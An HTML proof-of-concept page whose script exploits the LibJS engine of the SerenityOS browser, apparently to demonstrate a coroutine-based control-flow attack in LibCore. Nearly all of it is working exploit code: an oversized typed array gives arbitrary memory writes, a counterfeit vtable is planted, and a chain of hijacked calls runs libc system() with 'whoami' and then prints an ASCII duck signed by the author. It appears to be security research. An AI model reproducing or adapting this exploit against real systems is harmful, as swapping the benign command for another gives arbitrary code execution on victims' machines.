<!DOCTYPE html>
<html>

<head>
	<title>CFOP SerenityOS PoC</title>
</head>

<body>
	<h1>PoC for exploiting the coroutines in the SerenityOS LibCore</h1>
	<label for="hexInput">Enter the address of the pointer to overwrite (see recent program output):</label>
	<br>
	<input type="text" id="hexInput" placeholder="0x1234567890abcdef">
	<button onclick="processHex()">Submit</button>
	<br>
	<br>
	<p>After you click the previous button with the corresponding leak, the browser will execute <i>whoami()</i> twice
		times (if your user is "ubuntu", then "ubuntu" will be printed twice).
		After that, shows a beautiful duck.
	</p>


	<script>
		function log(msg) {
			console.log(msg);
		}

		function expHexStr(pointer) {
			const result = Math.floor(pointer / 4) - 1;
			return `0x${result.toString(16)}`;
		}

		function expHex(pointer) {
			return result = Math.floor(pointer / 4) - 1;
		}

		function write_64(base, value) {
			var addr = expHex(base);
			var lo = value & 0xFFFFFFFF;
			var hi = (value / 0x100000000) & 0xFFFFFFFF;

			//console.log(`write_64(${addr}, 0x${value.toString(16)}) => b[${addr}] = 0x${lo.toString(16)}, b[${expHex(base + 4)}] = 0x${hi.toString(16)}`);
			b[addr] = lo;
			b[expHex(base + 4)] = hi;
		}

		function write_string(address, s) {
			// Pad with null bytes to ensure a multiple of 8
			while (s.length % 8 !== 0) s += '\x00';

			for (let i = 0; i < s.length; i += 8) {
				// Little-endian: lowest-addressed byte is s[i]
				let lo = 0, hi = 0;
				for (let j = 0; j < 4; ++j) {
					lo |= (s.charCodeAt(i + j) || 0) << (8 * j);
					hi |= (s.charCodeAt(i + 4 + j) || 0) << (8 * j);
				}
				// Now, reconstruct full value as Number for write_64
				// NOTE: This only works reliably for data that doesn't exceed 53 bits set!
				// If corrupted for >2^53, that's a JS limitation.
				b[expHex(address + i)] = lo;
				b[expHex(address + i + 4)] = hi;
			}
		}

		log("starting exploit");

		// Firstly, define exploit primitives for vulnerability
		a = new ArrayBuffer()
		b = new Uint32Array(a, 4, 0x3fffffff)

		// We proceed to make a test, that will 1)check that the address is writable and 2) print on screen the address of b
		b[expHex(0x00007ffffffee000)] = 0


		function processHex() {
			var vtable_hexvalue, vtable_msb, vtable_lsb
			const input = document.getElementById('hexInput').value;
			const hexPattern = /^0x[0-9a-fA-F]{16}$/; // Validate format: 0x followed by 16 hex digits

			if (hexPattern.test(input)) {
				vtable_hexvalue = BigInt(input); // Store the valid hex value
				vtable_msb = vtable_hexvalue >> 32n;
				vtable_lsb = vtable_hexvalue & 0xffffffffn;
				//convert to numbers, not using the upper bits anyways
				vtable_hexvalue = Number(vtable_hexvalue)
				vtable_msb = Number(vtable_msb)
				vtable_lsb = Number(vtable_lsb)
				console.log("Valid hex input received:", vtable_hexvalue);
				console.log("MSB:", "0x" + vtable_msb.toString(16).padStart(8, '0')); // Print MSB in hex
				console.log("LSB:", "0x" + vtable_lsb.toString(16).padStart(8, '0')); // Print LSB in hex
			} else {
				console.error("Invalid input. Please enter a hex number in the format 0x1234567890abcdef.");
				alert("Invalid input! Please use the format 0x1234567890abcdef.");
				return;
			}

			////
			//New vtable position of internal_get between *_*. Writable memory
			//
			//0x7ffff5833108 <_ZTVN2JS11Uint32ArrayE+16>:     0x00007ffff55585ea      0x00007ffff56603d4
			//0x7ffff5833118 <_ZTVN2JS11Uint32ArrayE+32>:     0x00007ffff5660b20      0x00007ffff56769e2
			//0x7ffff5833128 <_ZTVN2JS11Uint32ArrayE+48>:     0x00007ffff56601aa      0x00007ffff5347f06
			//0x7ffff5833138 <_ZTVN2JS11Uint32ArrayE+64>:     0x00007ffff5347f0c      0x00007ffff555b336
			//0x7ffff5833148 <_ZTVN2JS11Uint32ArrayE+80>:     0x00007ffff5558f84      0x00007ffff5558ee8
			//0x7ffff5833158 <_ZTVN2JS11Uint32ArrayE+96>:     0x00007ffff5558f36      0x00007ffff567f4a2
			//0x7ffff5833168 <_ZTVN2JS11Uint32ArrayE+112>:    0x00007ffff567bb0e      0x00007ffff5679932
			//0x7ffff5833178 <_ZTVN2JS11Uint32ArrayE+128>:    0x00007ffff567df9e      *0x00007ffff567b8dc*
			//0x7ffff5833188 <_ZTVN2JS11Uint32ArrayE+144>:    0x00007ffff5679866      0x00007ffff5681318
			//0x7ffff5833198 <_ZTVN2JS11Uint32ArrayE+160>:    0x00007ffff53d2a36      0x00007ffff53d2a40
			//0x7ffff58331a8 <_ZTVN2JS11Uint32ArrayE+176>:    0x00007ffff53d2a4a      0x00007ffff53d2a54
			//0x7ffff58331b8 <_ZTVN2JS11Uint32ArrayE+192>:    0x00007ffff53d2a5e      0x00007ffff53d2a68
			//0x7ffff58331c8 <_ZTVN2JS11Uint32ArrayE+208>:    0x00007ffff53d2a72      0x00007ffff53d2a7c
			//0x7ffff58331d8 <_ZTVN2JS11Uint32ArrayE+224>:    0x00007ffff53d2a86      0x00007ffff53d2a90
			//0x7ffff58331e8 <_ZTVN2JS11Uint32ArrayE+240>:    0x00007ffff5661e08      0x00007ffff5676d34
			//0x7ffff58331f8 <_ZTVN2JS11Uint32ArrayE+256>:    0x00007ffff5676d3e      0x00007ffff567df7c
			////

			//The point where the vtable pointer is stored
			ORIGINAL_VTABLE_PTR = vtable_hexvalue
			//The new base of the vtable, where the vptrs are stored
			_NEW_VTABLE_BASE = 0x00007ffffffee000
			//The base of our ICC chain (that later switches to ICC_CHAIN_BASE), only first element
			ICC_LAUNCH_CHAIN_BASE = ORIGINAL_VTABLE_PTR

			log("Now writing the counterfeit vtable");

			write_64(_NEW_VTABLE_BASE, 0x00007ffff55585ea)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff56603d4)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff5660b20)

			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff56769e2)

			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff56601aa)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff5347f06)

			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff5347f0c)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff555b336)

			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff5558f84)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff5558ee8)

			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff5558f36)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff567f4a2)

			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff567bb0e)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff5679932)

			//modthis with jump address to adopt_coroutine resume frame: operator()(_ZZN4Core9EventLoop15adopt_coroutineEON2AK9CoroutineIvEEENUlS4_E_clES4_.Frame *)
			//note that the exploit sets index=4 to jump to destroy() and then await_suspend
			//0x00007ffff5909576
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff567df9e)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff5909576) //this is the one to modify

			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff5679866)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff5681318)

			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff53d2a36)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff53d2a40)

			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff53d2a4a)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff53d2a54)

			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff53d2a5e)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff53d2a68)

			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff53d2a72)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff53d2a7c)

			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff53d2a86)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff53d2a90)

			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff5661e08)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff5676d34)

			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff5676d3e)
			write_64(_NEW_VTABLE_BASE += 8, 0x00007ffff567df7c)


			////
			//
			//  The following is how one of the elements in the ICC chain is encoded
			//
			//  0x0:    xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
			//  0x10:   xxxxxxxxxxxxxxxx  _AFTEREXP_ICC_BASE+0x20 <-- handler(rsi) during await_suspend
			//  0x20:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
			//  0x30:   0000000000000004  _AFTEREXP_ICC_BASE <--used during destroyer
			//  0x40:   RDIRDIRDIRDIRDI.  xxxxxxxxxxxxxxxx <-- (not needed) rdi in await_suspend
			//  0x50:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
			//  0x60:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
			//  0x70:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
			//  0x80:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
			//  0x90:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
			//  0xA0:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
			//  0xB0:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
			//  0xC0:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
			//  0xD0:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
			//  0xE0:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
			//  0xF0:   xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
			//  0x100:  xxxxxxxxxxxxxxxx  xxxxxxxxxxxxxxxx
			//
			//
			//  Safer if the rest of the chain is together with the rest of the payload (after the vtable data)
			//  _NEW_VTABLE_BASE
			//  0x0
			//  0x10
			//  ...
			//  0xF0
			//  0x110:
			_AFTEREXP_ICC_BASE = 0x00007ffffffee120 //_NEW_VTABLE_BASE + 0x120
			//  0x120:  00007ffffffde130  AAAAAAAAAAAAAAAA <-- call target 1 (next ICC chain start) = 0x00007ffff5909576 (frame resume)   
			//  0x130:  0000000000000000  XXXXXXXXXXXXXXXX <--- for the 3rd chain
			//  0x140:  CCCCCCCCCCCCCCCC  BBBBBBBBBBBBBBBB <-- call target 2, with 1 controlled ptr arg (0xCC..CCC)
			//
			// Subsequent elements in the chain just repeat the above structure
			//  0x150:  xxxxxxxxxxxxxxxx  _AFTEREXP_ICC_BASE+0x20
			//
			////

			log("Now writing the data necessary for our ICC");

			// Dump of assembler code for function ZSTD_freeCCtxParams:
			//  0x00007ffff3f872b0 <+0>:     endbr64
			//  0x00007ffff3f872b4 <+4>:     test   rdi,rdi
			//  0x00007ffff3f872b7 <+7>:     je     0x7ffff3f872e0 <ZSTD_freeCCtxParams+48>
			//  0x00007ffff3f872b9 <+9>:     push   rbp
			//  0x00007ffff3f872ba <+10>:    mov    rax,QWORD PTR [rdi+0xa0]
			//  0x00007ffff3f872c1 <+17>:    mov    rsi,rdi
			//  0x00007ffff3f872c4 <+20>:    mov    rdi,QWORD PTR [rdi+0xa8]
			//  0x00007ffff3f872cb <+27>:    mov    rbp,rsp
			//  0x00007ffff3f872ce <+30>:    test   rax,rax
			//  0x00007ffff3f872d1 <+33>:    je     0x7ffff3f872e8 <ZSTD_freeCCtxParams+56>
			//  0x00007ffff3f872d3 <+35>:    call   rax
			_MID_FUNC_ADJUSTER = 0x00007ffff3f872b0
			_libc_system = 0x00007ffff4dc8750

			//ICC launch
			write_64(_AFTEREXP_ICC_BASE, 0x0000000000000000)
			write_64(_AFTEREXP_ICC_BASE += 8, 0x00007ffff5909576) //1st chain - frame_resume for next chain item (2nd) = 0x00007ffff5909576
			write_64(_AFTEREXP_ICC_BASE += 8, 0x0000000000000000)
			write_64(_AFTEREXP_ICC_BASE += 8, 0x00007ffffffee160) //2nd chain - pointer to *(system()-0x8): ...158
			write_64(_AFTEREXP_ICC_BASE += 8, 0x0000696d616f6877) //1st chain - arg = "whoami"
			write_64(_AFTEREXP_ICC_BASE += 8, _libc_system) //1st chain - system()
			//next chain element
			write_64(_AFTEREXP_ICC_BASE += 8, 0x0000000000000004) //2nd chain - SP index
			write_64(_AFTEREXP_ICC_BASE += 8, 0x00007ffffffee1b0) //2nd chain - used during the destroyer rdi-> 0x...1b0
			write_64(_AFTEREXP_ICC_BASE += 8, 0x0000696d616f6877) //2st chain - arg = "whoami"
			write_64(_AFTEREXP_ICC_BASE += 8, _libc_system) //2nd chain - system()

			write_64(_AFTEREXP_ICC_BASE += 8, 0x0000000000000000)
			write_64(_AFTEREXP_ICC_BASE += 8, 0x0000000000000000)
			write_64(_AFTEREXP_ICC_BASE += 8, 0x0000000000000000)
			write_64(_AFTEREXP_ICC_BASE += 8, 0x0000000000000000)
			write_64(_AFTEREXP_ICC_BASE += 8, 0x0000000000000000)
			write_64(_AFTEREXP_ICC_BASE += 8, _libc_system) //system() = 0x7ffff4dc8750 - this is just for convenience during ICC, another arbitrary call to system with no args, but you can use it too
			write_64(_AFTEREXP_ICC_BASE += 8, 0x0000696d616f6877) //2nd chain - arg = "whoami"
			write_64(_AFTEREXP_ICC_BASE += 8, _libc_system) //2nd chain - system() = 0x7ffff4dc8750
			write_64(_AFTEREXP_ICC_BASE += 8, 0x0000000000000000)
			write_64(_AFTEREXP_ICC_BASE += 8, 0x00007ffff5909576)  //2nd chain - frame_resume for next chain item (3rd)= 0x00007ffff5909576)
			write_64(_AFTEREXP_ICC_BASE += 8, 0x0000000000000000)
			write_64(_AFTEREXP_ICC_BASE += 8, 0x00007ffffffee1d0) //3rd chain - pointer to *(system()-0x8): ...1d0
			write_64(_AFTEREXP_ICC_BASE += 8, 0x0000000000000000) //3rd chain - arg -> not needed, we go to rdi pivot
			write_64(_AFTEREXP_ICC_BASE += 8, _MID_FUNC_ADJUSTER) //3rd chain - rdi pivot gadget
			write_64(_AFTEREXP_ICC_BASE += 8, 0x0000000000000004) 
			write_64(_AFTEREXP_ICC_BASE += 8, 0x00007ffffffee190) //2nd chain - pointer to *(system()-0x8): ...190
			write_64(_AFTEREXP_ICC_BASE += 8, 0x0000000000000000)
			write_64(_AFTEREXP_ICC_BASE += 8, 0x00007ffff4dc8750)


			//This part is to print a cute duck. We will need an intermediate gadget for pivoting rdi
			write_64(_AFTEREXP_ICC_BASE + 0xa0 - 40, 0x00007ffff4dc8750) //fptr = rax = system()
			write_64(_AFTEREXP_ICC_BASE + 0xa8 - 40, _AFTEREXP_ICC_BASE + 0xc0) //final rdi before system()
			log("Writing duck string at " + (_AFTEREXP_ICC_BASE + 0xc0).toString(16));
			write_string(_AFTEREXP_ICC_BASE + 0xc0, "echo \"\n    \033[31m_      \033[33m_      \033[32m_      \033[36m_      \033[34m_      \033[35m_\n  \033[31m>(.)__ \033[33m<(.)__ \033[32m=(.)__ \033[36m>(.)__ \033[34m<(.)__ \033[35m=(.)__\n   \033[31m(___/  \033[33m(___/  \033[32m(___/  \033[36m(___/  \033[34m(___/  \033[35m(___/\n\n               \033[1;33mCFOP by h3xduck\033[0m\n\n\"");

			log("Proceeding to overwrite the vtable itself, first not the pointer, but surronding data");
			//Setup ICC chain next to the vtable ptr

			b[expHex(ORIGINAL_VTABLE_PTR + 0x30)] = 0x00000004
			b[expHex(ORIGINAL_VTABLE_PTR + 0x18)] = 0xfffee140  //mod with _NEW_VTABLE_BASE+140 = 0x00007ffffffee140
			b[expHex(ORIGINAL_VTABLE_PTR + 0x1C)] = 0x00007fff
			b[expHex(ORIGINAL_VTABLE_PTR + 0x38)] = 0xfffee120  //mod with _NEW_VTABLE_BASE+120 = 0x00007ffffffee140
			b[expHex(ORIGINAL_VTABLE_PTR + 0x3C)] = 0x00007fff

			log("Now overwriting the vtable ptr itself");
			//Overwrite vtable ptr itself. 
			//From this pointer onwards, any call to internal_get (throught b[x]), triggers the exploit
			//Note: the vtable might have changed at this point, check it now
			b[expHex(ORIGINAL_VTABLE_PTR)] = 0xfffee000 //modthis with new vtable ptr 0x00007ffffffee000

			log("At this point we are ready for the exploit, let's go!");
			b[expHex(ORIGINAL_VTABLE_PTR + 4)] = 0x00007fff
		}
	</script>
</body>

</html>